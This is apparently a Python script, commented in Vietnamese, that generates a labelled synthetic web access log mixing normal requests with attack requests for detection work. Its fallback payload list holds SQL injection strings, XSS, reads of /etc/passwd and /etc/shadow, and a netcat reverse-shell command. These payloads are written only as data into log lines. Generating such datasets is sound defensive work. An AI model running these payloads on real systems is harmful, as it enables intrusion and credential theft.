import requests
import random
from datetime import datetime, timedelta

# --- CẤU HÌNH ---
OUTPUT_FILE = "dataset_evaluated.log"
NUM_NORMAL = 2000   
NUM_ATTACKS = 2000  

# Nguồn Payload (Dự phòng thêm payload cứng nếu mất mạng)
PAYLOAD_SOURCES = {
    "SQLi": "https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/t00ls-sql-library.txt",
    "XSS": "https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payloads.txt",
    "LFI": "https://raw.githubusercontent.com/payloadbox/directory-traversal-payload-list/master/directory-traversal-payload-list.txt"
}

# Payload cứng để backup (nếu không tải được từ github)
HARDCODED_PAYLOADS = [
    "' OR '1'='1", "UNION SELECT 1, user, pass FROM users", "<script>alert(1)</script>",
    "../../../../etc/passwd", "; cat /etc/shadow", "| nc -e /bin/sh 1.2.3.4 4444",
    "/admin/config.php.bak", "Waitfor delay '0:0:10'", "javascript:alert(1)"
] * 50 

# Dữ liệu giả lập cho Log sạch
NORMAL_PATHS = ["/index.php", "/home", "/about", "/contact", "/products", "/login", "/api/user", "/assets/style.css", "/js/main.js", "/images/banner.jpg"]
NORMAL_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
]

def download_payloads():
    print("[*] Đang tải payload từ GitHub...")
    attacks = []
    for name, url in PAYLOAD_SOURCES.items():
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                lines = [l.strip() for l in r.text.splitlines() if len(l) > 4] 
                print(f"   + {name}: {len(lines)} mẫu")
                attacks.extend(lines)
        except:
            print(f"   ! Lỗi tải {name}, dùng payload dự phòng.")
    
    # Nếu ít quá hoặc lỗi mạng, trộn thêm payload cứng
    if len(attacks) < 100:
        attacks.extend(HARDCODED_PAYLOADS)
    
    # Loại bỏ trùng lặp và xáo trộn
    attacks = list(set(attacks))
    random.shuffle(attacks)
    print(f"[*] Tổng mẫu payload độc nhất: {len(attacks)}")
    return attacks

def generate():
    attack_payloads = download_payloads()
    
    # Quan trọng: Tạo danh sách attack lặp lại cho đủ số lượng yêu cầu
    final_attack_list = []
    while len(final_attack_list) < NUM_ATTACKS:
        final_attack_list.extend(attack_payloads)
    # Cắt cho đúng số lượng yêu cầu
    final_attack_list = final_attack_list[:NUM_ATTACKS]

    print(f"[*] Đang sinh {NUM_NORMAL} sạch + {NUM_ATTACKS} tấn công vào '{OUTPUT_FILE}'...")
    
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        start_time = datetime.now()
        
        # 1. Ghi Log Sạch
        for _ in range(NUM_NORMAL):
            ip = f"{random.randint(10,192)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            dt = start_time.strftime("%d/%b/%Y:%H:%M:%S +0700")
            path = random.choice(NORMAL_PATHS)
            # NHÃN SẠCH: User-Agent bình thường
            ua = random.choice(NORMAL_UAS) 
            status = 200
            
            line = f'{ip} - - [{dt}] "GET {path} HTTP/1.1" {status} {random.randint(200,5000)} "-" "{ua}"\n'
            f.write(line)
            start_time += timedelta(seconds=random.randint(1, 2))

        # 2. Ghi Log Tấn Công
        for payload in final_attack_list:
            ip = f"192.168.66.{random.randint(1,254)}"
            dt = start_time.strftime("%d/%b/%Y:%H:%M:%S +0700")
            
            # Chọn endpoint ngẫu nhiên
            base = random.choice(["/search?q=", "/prod?id=", "/login?u=", "/?cmd="])
            full_url = f"{base}{payload}"
            
            ua = "Mozilla/5.0 (Windows NT 10.0) (Simulated-Attack)" 
            status = 200
            
            # Lưu ý: Python f-string không tự escape ngoặc kép trong payload, ta kệ nó (để mô phỏng raw)
            # Trong thực tế payload có thể chứa " làm hỏng format log, nhưng script đọc log của chúng ta handle được lỗi
            line = f'{ip} - - [{dt}] "GET {full_url} HTTP/1.1" {status} {random.randint(200,5000)} "-" "{ua}"\n'
            f.write(line)
            start_time += timedelta(seconds=random.randint(1, 2))

    print(f"[DONE] Đã tạo file '{OUTPUT_FILE}'.")
    print(f"       Clean: {NUM_NORMAL} | Attack: {NUM_ATTACKS}")
    print("       (Dấu hiệu nhận biết Attack: User-Agent chứa '(Simulated-Attack)')")

if __name__ == "__main__":
    generate()